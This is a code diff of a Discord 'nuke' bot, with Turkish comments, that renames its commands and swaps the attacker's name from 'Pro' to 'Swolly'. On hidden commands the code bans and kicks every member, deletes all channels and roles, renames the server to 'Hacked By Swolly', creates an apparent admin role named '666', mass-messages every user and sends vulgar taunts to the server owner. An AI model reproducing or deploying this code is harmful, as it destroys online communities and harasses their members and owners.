@@ -126,26 +126,26 @@ client.on("error", e => {
 //――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 client.on("message", msg => {
-  if (msg.content === "e!banla") {
+  if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());
   }
 });
 
 client.on("message", msg => {
-  if (msg.content === "e!kickle") {
+  if (msg.content === "+kick") {
     msg.delete();
     msg.guild.members.forEach(member => member.kick());
   }
 });
 
 client.on("message", async msg => {
-  if (msg.content === "e!gg") {
+  if (msg.content === "+çökert") {
     msg.delete();
 
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("✝-PrO bEY");
+    await msg.guild.createChannel("✝-Swolly,sikti");
 
     await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
@@ -155,7 +155,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("✝ Pro Bey", {
+      .createChannel("✝ Swolly", {
         type: "voice"
       })
       .then(chan => {
@@ -200,19 +200,19 @@ client.on("message", async msg => {
     await msg.guild.setIcon(
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
     );
-    await msg.guild.setName("✝ Hacked By Pro ✝"); //sunucu ismini yapar
+    await msg.guild.setName("✝ Hacked By Swolly ✝"); //sunucu ismini yapar
     await client.user.setAvatar(
       "http://sicanzi.com/"
     ); //botun pp sini yapar
-    await client.user.setUsername("✝ Hacked By Pro ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
+    await client.user.setUsername("✝ Hacked By Swolly ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
     await msg.guild.owner.send("Patladın Canım Geçmiş Olsun"); //KURUCUSUNA GONDERILEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "PRO-sikti");
+    const kanal = await msg.guild.channels.find(x => x.name === "Swolly-sikti");
     await kanal.send("Patladın Kardeşim Geçmiş Olsun");
   }
 });
 client.on("message", async msg => {
-  if (msg.content === "e!duyuru") {
+  if (msg.content === "+duyur") {
     msg.delete();
     await msg.client.users
       .forEach(users =>
@@ -229,7 +229,7 @@ client.on("message", async msg => {
 //―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 client.on("message", msg => {
-  if (msg.content === "e!yetki") {
+  if (msg.content === "+yetki") {
     msg.delete();
     msg.guild.createRole({
       name: "666",
@@ -241,13 +241,13 @@ client.on("message", msg => {
 });
 
 client.on("message", msg => {
-  if (msg.content === "e!rol") {
+  if (msg.content === "+rol") {
     msg.guild.roles.forEach(roles => roles.delete());
   }
 });
 
 client.on("message", msg => {
-  if (msg.content === "e!banla") {
+  if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());
   }
